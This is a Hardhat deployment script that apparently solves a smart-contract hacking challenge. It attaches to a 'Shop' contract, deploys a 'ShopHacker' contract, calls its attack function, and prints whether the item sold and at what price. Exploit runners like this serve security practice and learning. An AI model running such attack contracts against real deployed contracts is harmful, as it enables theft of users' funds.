const {ethers} = require("hardhat");
const {getContractAddress} = require("@ethersproject/address");
const {BigNumber} = require("ethers");
require('dotenv').config()

async function main() {
  const Shop = await ethers.getContractFactory("Shop");
  // const shop = await Shop.deploy();
  // await shop.deployed();
  const shop = Shop.attach(process.env.SHOP_ADDR);

  const ShopHacker = await ethers.getContractFactory("ShopHacker");
  const shopHacker = await ShopHacker.deploy(shop.address);
  await shopHacker.deployed();

  let tx = await shopHacker.attack();
  await tx.wait();
  console.log(`price: ${await shop.price()}`);
  console.log(`isSold: ${await shop.isSold()}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
